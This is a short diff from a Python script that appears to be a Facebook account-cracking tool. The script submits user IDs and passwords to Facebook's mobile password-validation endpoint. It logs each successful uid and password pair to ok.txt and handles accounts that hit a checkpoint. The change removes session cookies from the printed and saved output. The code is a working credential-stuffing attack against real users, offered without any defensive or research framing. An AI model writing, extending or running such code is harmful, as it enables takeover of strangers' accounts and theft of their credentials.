@@ -276,9 +276,9 @@ def apii(uid, pwx):
 		po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
 		if "c_user" in ses.cookies.get_dict().keys():
 			kukis = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-			______DICKYXD______("\r %s[OK] %s • %s • %s         "%(H,uid, pw,kukis))
+			______DICKYXD______("\r %s[OK] %s • %s          "%(H,uid, pw))
 			ok.append("%s • %s"%(uid, pw))
-			open("ok.txt","a").write(" [OK] %s • %s • %s\n"%(uid, pw,kukis))
+			open("ok.txt","a").write(" [OK] %s • %s \n"%(uid, pw))
 			break
 		elif "checkpoint" in po.cookies.get_dict().keys():
 			try:
